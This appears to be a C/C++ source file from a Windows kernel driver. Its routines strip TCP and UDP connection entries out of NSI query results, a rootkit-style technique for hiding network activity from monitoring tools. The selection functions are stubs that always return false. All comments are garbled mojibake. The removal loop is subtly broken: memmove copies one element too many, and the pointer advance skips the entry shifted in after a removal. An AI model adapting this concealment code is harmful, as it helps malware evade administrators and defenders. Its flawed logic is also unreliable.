#include "Hide.h"

bool g_IsHide;//���ص��ܿ��ء�


//////////////////////////////////////////////////////////////////////////////////////////////////


bool IsHideUdp(_In_ PUdpTable Entry)
/*
���ܣ�ʶ���ǲ���Ҫ���ص���Ϣ��

���ڻ����Կ��ǼӲ������磺���̵ȡ�
*/
{
    bool ret = false;

    UNREFERENCED_PARAMETER(Entry);


    return ret;
}


bool IsHideTcp(_In_ PTcpTable Entry)
/*
���ܣ�ʶ���ǲ���Ҫ���ص���Ϣ��

���ڻ����Կ��ǼӲ������磺���̵ȡ�
*/
{
    bool ret = false;

    UNREFERENCED_PARAMETER(Entry);


    return ret;
}


void HideUdpInfo(_In_ PNsiParameters70 NsiParam)
/*
���ܣ�����UDP������Ϣ���磺���ض˿ڡ�

�߼�����������ĳ�����̵����е������ͨѶ��Ϣ��

������
�Ƴ�p1,p2,StateInfo,p4�����Ӧ�Ľڵ�Ԫ����Ϣ���ɡ�
���Ҫ���ˣ�����Counter��Ա��ֵ��
*/
{
    if (nullptr == NsiParam) {
        return;
    }

    if (0 == NsiParam->Counter) {
        return;
    }

    PUdpTable Table = (PUdpTable)NsiParam->p1;

    for (ULONG i = 0; i < NsiParam->Counter; i++) {
        if (NsiParam->p1) {
            if (IsHideUdp(Table)) {
                //�ƶ����Ԫ�غ�������ݵ����Ԫ�ص�λ�á�
                memmove(Table, Table + 1, NsiParam->size1 * (NsiParam->Counter - i));
                NsiParam->Counter--;
            }

            Table++;
        }

        if (NsiParam->p2) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�
        }

        if (NsiParam->StateInfo) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�
        }

        if (NsiParam->ProcessInfo) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�
        }
    }

    //����Counter��ֵ������Ѿ����£�������ԡ�
    //NsiParam->Counter = XXX��
}


void HideTcpInfo(_In_ PNsiParameters70 NsiParam)
/*
���ܣ�����Tcp������Ϣ���磺���ض˿ڣ�Զ��IP(v4/6)��

�߼�����������ĳ�����̵����е������ͨѶ��Ϣ��

������
�Ƴ�p1,p2,StateInfo,p4�����Ӧ�Ľڵ�Ԫ����Ϣ���ɡ�
���Ҫ���ˣ�����Counter��Ա��ֵ��

���Կ��ǣ���HideTcpInfo��HideUdpInfo�ϲ�Ϊģ�塣
*/
{
    if (nullptr == NsiParam) {
        return;
    }

    if (0 == NsiParam->Counter) {
        return;
    }

    PTcpTable Table = (PTcpTable)NsiParam->p1;

    for (ULONG i = 0; i < NsiParam->Counter; i++) {
        if (NsiParam->p1) {
            if (IsHideTcp(Table)) {
                //�ƶ����Ԫ�غ�������ݵ����Ԫ�ص�λ�á�
                memmove(Table, Table + 1, NsiParam->size1 * (NsiParam->Counter - i));
                NsiParam->Counter--;
            }

            Table++;
        }

        if (NsiParam->p2) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�
        }

        if (NsiParam->StateInfo) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�
        }

        if (NsiParam->ProcessInfo) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�
        }
    }

    //����Counter��ֵ������Ѿ����£�������ԡ�
    //NsiParam->Counter = XXX��
}
